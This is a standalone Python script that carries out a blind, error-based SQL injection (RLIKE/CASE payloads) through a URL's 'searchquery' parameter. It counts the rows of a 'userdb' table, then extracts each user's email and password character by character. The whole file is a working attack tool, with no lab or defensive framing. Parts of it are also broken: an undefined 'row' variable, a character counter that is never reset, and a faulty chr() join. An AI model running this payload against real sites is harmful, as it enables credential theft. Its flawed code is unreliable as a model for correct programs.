#!/usr/bin/python3

import requests
import argparse


def makeRequest(url, params, payload):
    params = dict(i.split('=') for i in params.split('&'))
    for key in params.keys():
        if "searchquery" in key:
            params[key] += payload
    r = requests.get(url, params)
    return r.text

def getRows(url, params):
    countLength = 1
    while True:
        payload = "test' RLIKE (SELECT (CASE WHEN ((SELECT";
        payload += " LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM";
        payload += " userdb)=" + str(countLength) + ") THEN 0x28 ELSE 0x41 END))"
        payload += " AND 'LeSo'='LeSo"

        response = makeRequest(url, params, payload)
        if "parentheses not balanced" in response:
            break
        countLength += 1
    i = 1
    c = 48
    numRows = []
    while i <= countLength:
        while c <= 58:
            payload = "test' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT"
            payload += " IFNULL(CAST(COUNT(*) AS CHAR), 0x20) FROM userdb),"
            payload += str(i) + ", 1))=" + str(c) + ") THEN 0x28 ELSE 0x41 END)) AND '"
            
            response = makeRequest(url, params, payload)
            if "parentheses not balanced" in response:
                numRows.append(chr(c))
                break
            c += 1
        i += 1
    numRows = int("".join(str(i) for i in numRows))
    print("Rows: " + str(numRows))
    return numRows

def getLength(i, item, url, params):
    countLength = 0
    while True:
        payload = "test' RLIKE (SELECT (CASE WHEN ((SELECT"
        payload += " LENGTH(IFNULL(CAST(CHAR_LENGTH(" + item + ") AS"
        payload += " CHAR),0x20)) FROM userdb ORDER BY email LIMIT "
        payload += str(i) + ",1)=" + str(countLength) + ") THEN 0x28 ELSE 0x41 END))"
        payload += " AND 'LeSo'='LeSo"

        response = makeRequest(url, params, payload)
        if "parentheses not balanced" in response:
            break
        countLength += 1
    itemLen = []
    j = 0
    c = 48
    while j <= countLength:
        while c<= 58:
            payload = "test' RLIKE (SELECT(CASE WHEN (ORD(MID((SELECT"
            payload += " IFNULL(CAST(CHAR_LENGTH(" + item + ") AS CHAR),0x20) FROM"
            payload += " userdb ORDER BY email LIMIT " + str(i) + ",1)," + str(j)
            payload += ",1))=" + str(c) + ") THEN 0x28 ELSE 0x41 END)) AND 'LeSo'='LeSo"

            response = makeRequest(url, params, payload)
            if "parentheses not balanced" in response:
                itemLen.append(chr(c))
                break
            c += 1
        j += 1
    itemLen = "".join(str(k) for k in itemLen)
    print(itemLen)
    return itemLen

def getValue(i, item, length, url, params):
    value = []
    j = 0
    c = 32
    if length:
        while j <= length:
            while c<= 126:
                payload = "test' RLIKE(SELECT (CASE WHEN (ORD(MID((SELECT"
                payload += " IFNULL(CAST(" + item+ " AS CHAR),0x20) FROM userdb ORDER BY"
                payload += " email LIMIT " + row + ",1)," + str(j) + ",1))=" + str(c) + ") THEN 0x28 ELSE 0x41"
                payload += " END)) and 'LeSo'='LeSo"

                response = makeRequest(url, params, payload)
                if "parentheses not balanced" in response:
                    value.append(chr(c))
                    break
                c += 1
            j += 1
    value = "".join(chr(k) for k in value)
    print(value)
    return value

def printValues(i, item, length, value):
    print("Row " + str(i) + " - " + item + ": " + value + " Length: " + str(length) + " bytes")

def main(args):
    url = args.url.split('?')[0]
    params = args.url.split('?')[1]
    columns = ["email", "passwd"]
    numRows = getRows(url, params)
    for i in range(0, numRows):
        for item in columns:
            length = getLength(i, item, url, params)
            value = getValue(i, item, length, url, params)
            printValues(i, item, length, value)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True, help="url to attack")
    args = parser.parse_args()
    main(args)
